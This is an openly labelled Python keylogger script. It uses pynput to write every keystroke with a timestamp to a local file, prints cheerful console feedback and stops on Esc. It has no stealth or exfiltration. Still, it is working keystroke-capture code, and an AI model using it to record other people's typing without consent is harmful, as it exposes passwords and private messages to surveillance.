from pynput import keyboard
import datetime

# The log file where keystrokes will be stored
log_file = "userdata.txt"
total_keys_pressed = 0
special_key_count = 0

# Function to format the key for logging
def format_key(key):
    global special_key_count
    if isinstance(key, keyboard.Key):
        special_key_count += 1
        return f"[{key.name.upper()}]"  # Human-readable special keys
    else:
        return key.char if key.char.isprintable() else "[UNPRINTABLE]"  # Filter out non-printable characters

# Function to write keystrokes to the log file with timestamp
def write_to_file(key):
    timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    formatted_key = format_key(key)
    
    with open(log_file, "a") as f:
        f.write(f"{timestamp} - {formatted_key}\n")

# Function to display fun ASCII art for certain keys
def show_ascii_art(key):
    if key == keyboard.Key.space:
        print("🚀 Blast off! [SPACEBAR]")
    elif key == keyboard.Key.enter:
        print("⚡ Powering through! [ENTER]")
    elif key == keyboard.Key.backspace:
        print("🔙 Woops! [BACKSPACE]")

# Function to handle key presses
def on_press(key):
    global total_keys_pressed
    total_keys_pressed += 1
    
    try:
        formatted_key = format_key(key)
        write_to_file(key)
        
        # Cool real-time feedback with sound or ASCII art
        show_ascii_art(key)

        # Fun display of key pressed
        print(f"Key pressed: {formatted_key} | Total keys pressed: {total_keys_pressed} | Special keys: {special_key_count}")
    except Exception as e:
        print(f"Error logging key: {str(e)}")

# Function to handle key releases
def on_release(key):
    if key == keyboard.Key.esc:
        # Provide a cool summary when the keylogger stops
        print("\n[INFO] Stopping keylogger...")
        print(f"\n--- Session Summary ---\nTotal Keys Pressed: {total_keys_pressed}\nSpecial Keys Pressed: {special_key_count}")
        return False  # Stop listener when 'Esc' is pressed

# Welcome message when starting the keylogger
print("[INFO] Keylogger started. Press [ESC] to stop recording.")
print("Get ready to have fun while typing! 🚀")

# Setting up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()